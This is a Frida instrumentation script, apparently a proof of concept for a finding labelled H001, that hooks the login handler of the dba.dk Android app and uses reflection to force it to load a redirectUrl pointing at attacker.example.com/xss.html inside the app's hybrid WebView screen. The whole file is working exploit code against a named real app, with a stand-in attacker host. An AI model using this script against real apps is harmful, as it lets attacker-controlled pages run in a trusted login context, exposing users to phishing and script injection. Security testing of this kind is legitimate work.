import Java from "frida-java-bridge";

function run(): void {
    Java.perform(() => {
        const Uri = Java.use("android.net.Uri");
        const NMPHybridHandler = Java.use("com.schibsted.nmp.android.hybrid.NMPHybridHandler");
        const ArrayList = Java.use("java.util.ArrayList");
        
        // Hook handleUrl for observation
        NMPHybridHandler.handleUrl.implementation = function(url: any) {
            console.log("[H001-HOOK] handleUrl: " + url);
            return (this as any).handleUrl(url);
        };
        console.log("[H001] handleUrl hook installed");
        
        // Hook handleLogin to observe calls
        NMPHybridHandler.handleLogin.overload("android.net.Uri").implementation = function(uri: any) {
            const redirectUrl = uri.getQueryParameter("redirectUrl");
            console.log("[H001-HOOK] handleLogin called, redirectUrl=" + redirectUrl);
            return (this as any).handleLogin(uri);
        };
        console.log("[H001] handleLogin hook installed");
        
        // Hook constructor to catch fresh instances  
        NMPHybridHandler.$init.overload("android.content.Context", "java.util.List").implementation = function(ctx: any, list: any) {
            console.log("[H001-CTOR] NMPHybridHandler constructor called - new instance!");
            (this as any).$init(ctx, list);
            
            const self = this;
            setTimeout(function() {
                try {
                    const maliciousUri = Uri.parse(
                        "https://www.dba.dk/auth/app-login?redirectUrl=https://attacker.example.com/xss.html"
                    );
                    console.log("[H001] Invoking handleLogin with redirectUrl=https://attacker.example.com/xss.html");
                    
                    const javaClass = NMPHybridHandler.class;
                    const methods = javaClass.getDeclaredMethods();
                    for (let i = 0; i < methods.length; i++) {
                        const m = methods[i];
                        if (m.getName() === "handleLogin" && m.getParameterTypes().length === 1) {
                            m.setAccessible(true);
                            const result = m.invoke(self, [maliciousUri]);
                            console.log("[H001] handleLogin() returned: " + result);
                            console.log("[H001-EXPLOIT] redirectUrl=https://attacker.example.com/xss.html passed to NavigatorKt.set() -> new HybridScreen");
                            break;
                        }
                    }
                } catch (e2: any) {
                    console.log("[H001-INVOKE-WARN] " + e2);
                }
            }, 500);
        };
        console.log("[H001] Constructor hook installed - navigate to a hybrid page now");
        
        // Also try Java.choose in case there's already a live instance
        Java.choose("com.schibsted.nmp.android.hybrid.NMPHybridHandler", {
            onMatch: function(instance: any) {
                console.log("[H001-CHOOSE] Found existing NMPHybridHandler instance");
                try {
                    const maliciousUri = Uri.parse(
                        "https://www.dba.dk/auth/app-login?redirectUrl=https://attacker.example.com/xss.html"
                    );
                    const javaClass = NMPHybridHandler.class;
                    const methods = javaClass.getDeclaredMethods();
                    for (let i = 0; i < methods.length; i++) {
                        const m = methods[i];
                        if (m.getName() === "handleLogin" && m.getParameterTypes().length === 1) {
                            m.setAccessible(true);
                            const result = m.invoke(instance, [maliciousUri]);
                            console.log("[H001-CHOOSE] handleLogin() returned: " + result);
                            console.log("[H001-EXPLOIT] attacker URL now loading via existing instance");
                            break;
                        }
                    }
                } catch (e: any) {
                    console.log("[H001-CHOOSE-ERR] " + e);
                }
            },
            onComplete: function() {
                console.log("[H001-CHOOSE] Java.choose complete (existing instances scanned)");
            }
        });
    });
}

run();
